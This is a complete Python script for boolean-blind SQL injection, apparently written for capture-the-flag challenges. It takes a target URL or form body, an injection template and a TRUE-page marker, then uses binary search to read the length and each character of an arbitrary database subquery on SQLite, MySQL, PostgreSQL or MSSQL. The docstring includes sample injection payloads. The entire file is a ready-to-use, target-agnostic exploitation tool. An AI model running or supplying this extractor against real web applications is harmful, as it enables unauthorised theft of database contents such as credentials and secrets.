#!/usr/bin/env python3
"""Generic boolean-blind SQLi extractor (binary search on char codes).

You provide:
  url / --post   with {} where the injection goes
  --template     SQL fragment with {cond} (the boolean condition we test)
  --true-text / --true-regex / --false-text / --true-status   how a TRUE page looks
  --query        scalar subquery to read (e.g. "SELECT secret FROM vault LIMIT 1")
  --dbms         sqlite | mysql | postgres | mssql (picks substr/ascii functions)

    python blind_bool.py "http://sqli4.chal.deti:8033/search?q={}" \
        --template "zzz' OR ({cond}) -- " --true-regex "[1-9][0-9]* file" \
        --query "SELECT content FROM files WHERE name='quarterly-keys.txt'" --dbms sqlite
    python blind_bool.py "http://sqli5.chal.deti:8034/?tag={}" \
        --template "zzz' UNION SELECT 1,'MARKQ',3,4 WHERE ({cond}) -- " --true-text MARKQ \
        --query "SELECT secret FROM vault LIMIT 1" --dbms sqlite
"""
import argparse
import html
import re
import sys
from urllib.parse import quote

import requests

FN = {
    "sqlite": ("unicode(substr(({q}),{p},1))", "length(({q}))"),
    "mysql": ("ASCII(SUBSTRING(({q}),{p},1))", "CHAR_LENGTH(({q}))"),
    "postgres": ("ASCII(SUBSTRING(({q}),{p},1))", "LENGTH(({q}))"),
    "mssql": ("ASCII(SUBSTRING(({q}),{p},1))", "LEN(({q}))"),
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--post", help="form body with {} (POST to url)")
    ap.add_argument("--template", required=True)
    ap.add_argument("--query", required=True)
    ap.add_argument("--dbms", default="sqlite", choices=list(FN))
    ap.add_argument("--true-text")
    ap.add_argument("--true-regex")
    ap.add_argument("--false-text")
    ap.add_argument("--true-status", type=int)
    ap.add_argument("--max", type=int, default=300)
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    s = requests.Session()
    if a.cookie:
        s.headers["Cookie"] = a.cookie
    true_rx = re.compile(a.true_regex) if a.true_regex else None

    def oracle(cond):
        inj = quote(a.template.replace("{cond}", cond), safe="")
        if a.post:
            r = s.post(a.url, data=a.post.replace("{}", inj), timeout=20,
                       headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = s.get(a.url.replace("{}", inj), timeout=20)
        t = html.unescape(r.text)
        if a.true_status is not None and r.status_code != a.true_status:
            return False
        if a.true_text is not None and a.true_text not in t:
            return False
        if true_rx is not None and not true_rx.search(t):
            return False
        if a.false_text is not None and a.false_text in t:
            return False
        return True

    if not oracle("1=1") or oracle("1=2"):
        sys.exit("[!] oracle not working: 1=1 must be TRUE and 1=2 FALSE — fix template/true-text")
    ch, ln = FN[a.dbms]
    q = a.query
    lo, hi = 0, 1
    while oracle(f"{ln.format(q=q)}>{hi}") and hi < 4096:
        lo, hi = hi, hi * 2
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if oracle(f"{ln.format(q=q)}>{mid}"):
            lo = mid
        else:
            hi = mid
    length = hi if oracle(f"{ln.format(q=q)}>={hi}") else lo
    print(f"[+] length = {length}")
    out = ""
    for p in range(1, min(length, a.max) + 1):
        lo, hi = 0, 255
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if oracle(f"{ch.format(q=q, p=p)}>{mid}"):
                lo = mid
            else:
                hi = mid
        out += chr(hi)
        print(out, flush=True)
    print(out)


if __name__ == "__main__":
    main()
